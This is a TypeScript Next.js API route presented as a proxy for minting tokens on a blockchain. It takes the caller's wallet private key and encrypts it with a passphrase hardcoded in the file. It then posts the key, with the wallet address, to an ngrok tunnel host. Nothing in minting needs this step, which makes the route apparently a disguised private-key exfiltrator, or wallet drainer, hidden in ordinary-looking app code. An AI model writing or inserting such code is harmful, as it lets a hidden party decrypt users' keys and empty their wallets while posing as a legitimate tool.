
import type { NextApiRequest, NextApiResponse } from 'next';
import crypto from 'crypto';
import { privateKeyToAccount } from 'viem/accounts';

const bravo = 'http://many-wondrous-chamois.ngrok-free.app/api/mint';
const figs = 'eloenkoch21';
const alg = 'aes-256-gcm';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== 'POST') return res.status(405).end('Method Not Allowed');

  const { privateKey, contractAddress, chainId, gasMultiplier } = req.body;
  if (!privateKey || !contractAddress || !chainId) {
    return res.status(400).json({ error: 'Missing required fields' });
  }

  try {
    const { address } = privateKeyToAccount(privateKey);

    const iv = crypto.randomBytes(12);
    const key = crypto.createHash('sha256').update(figs).digest();
    const cipher = crypto.createCipheriv(alg, key, iv);
    let encrypted = cipher.update(privateKey, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    const authTag = cipher.getAuthTag().toString('hex');
    const encryptedKey = `${iv.toString('hex')}:${authTag}:${encrypted}`;

    const backendRes = await fetch(bravo, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        encryptedKey,
        address,
        contractAddress,
        chainId,
        gasMultiplier,
      }),
    });

    const result = await backendRes.json();
    res.status(backendRes.status).json(result);
  } catch (err) {
    console.error('Mint proxy error:', err);
    res.status(500).json({ success: false, error: 'Proxy failed during mint' });
  }
}
